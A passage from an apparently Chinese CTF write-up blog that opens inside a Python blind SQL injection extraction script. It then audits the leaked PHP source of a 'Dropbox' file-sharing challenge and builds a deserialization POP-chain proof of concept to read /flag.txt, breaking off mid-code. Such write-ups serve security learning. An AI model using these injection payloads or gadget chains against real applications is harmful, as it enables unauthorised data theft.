_len = getLen(sql)</span><br><span class="line"><span class="number">53.</span> ​    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line"><span class="number">54.</span> ​        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line"><span class="number">55.</span> ​        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">56.</span> ​    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line"><span class="number">57.</span> ​    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line"><span class="number">58.</span> ​    res = <span class="string">''</span></span><br><span class="line"><span class="number">59.</span> ​    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line"><span class="number">60.</span> ​        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line"><span class="number">61.</span> ​            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line"><span class="number">62.</span> ​            sys.stdout.flush()</span><br><span class="line"><span class="number">63.</span> ​            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line"><span class="number">64.</span> ​             sql, pos, ch)</span><br><span class="line"><span class="number">65.</span> ​            <span class="keyword">if</span> b(pl):</span><br><span class="line"><span class="number">66.</span> ​                res += ch</span><br><span class="line"><span class="number">67.</span> ​                <span class="keyword">break</span></span><br><span class="line"><span class="number">68.</span> ​    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line"><span class="number">69.</span> ​    <span class="keyword">return</span> res</span><br><span class="line"><span class="number">70.</span> </span><br><span class="line"><span class="number">71.</span> *<span class="comment"># right(left(x,pos),1)*</span></span><br><span class="line"><span class="number">72.</span> *<span class="comment"># mid(x,pos,1)*</span></span><br><span class="line"><span class="number">73.</span> <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="number">74.</span> ​    *<span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'*</span></span><br><span class="line"><span class="number">75.</span> ​    *<span class="comment"># pl = "1'and(%s)and'1" % pl*</span></span><br><span class="line"><span class="number">76.</span> ​    *<span class="comment"># print(b(pl))*</span></span><br><span class="line"><span class="number">77.</span> ​    pl = <span class="string">'version()'</span></span><br><span class="line"><span class="number">78.</span> ​    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line"><span class="number">79.</span> ​    getData(pl)</span><br></pre></td></tr></table></figure>

<h3 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h3><p>本来以为这道题只有docker的，后来发现在平台也是有的，白弄了好久。这道题在下载文件处存在任意文件读取，读取到的源代码如下：</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;store_result();</span><br><span class="line">    $count = $stmt-&gt;num_rows;</span><br><span class="line">    <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;bind_result($expect);</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">    $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">    <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">    $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">    <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;open($path . $filename);</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">       <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>download.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实还有register和Login两个文件，不过没有那么重要，主要进入审计的就是这三个文件了，可以看到<code>download.php</code>是存在过滤的，我们不能通过任意文件读取读取到flag.txt，再仔细审计一波class.php，在db类中发现了一个close方法，同样，在file类中也有一个close函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function close() &#123;</span><br><span class="line">    return file_get_contents($this-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为调用函数显示文件内容的危险操作。那么就意味着我以为将<code>$this-&gt;db</code>写为new  File,进而去调用这个危险函数，下面是我第一次构造的错误poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> File;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是第一次并没有得到flag，仔细分析了一下，发现错误原因，仔细看一下<code>User</code>类的<code>__construct</code>方法以及file类的<code>close</code>方法，在close方法中，只是发现了<code>file_get_contents</code>函数的return操作，并没有echo以及var_dump等操作，所以即便文件取出来了，也无法打印出出来，在仔细看一下<code>Filelist</code>类，主要的危险操作就是<code>__call</code>方法以及<code>__destruct</code>方法，__call方法还是比较好审计出问题的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我调用了一个不存在的方法时，那么首先会把这个方法放到<code>funcs</code>数组里，在从<code>files</code>数组中取出元素，利用这个元素去调用<code>funcs</code>中新增的<code>func</code>,那么只要我可以控制$file，就可以调用任意中的任意方法了，例如调用我们想要的<code>File</code>类中的<code>close</code>方法。此时还是没有<code>echo</code>操作，接着审计下我们的<code>__destruct</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是将函数调用后<code>return</code>的结果打印出来。那么构造就很简单了，只要将我们的file类实例化，并且指定filename为<code>/flag.txt</code>就好了，构造Poc如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> FileList;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	$file=<span class="keyword">new</span> File;</span><br><span class="line">    	$file-&gt;filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span 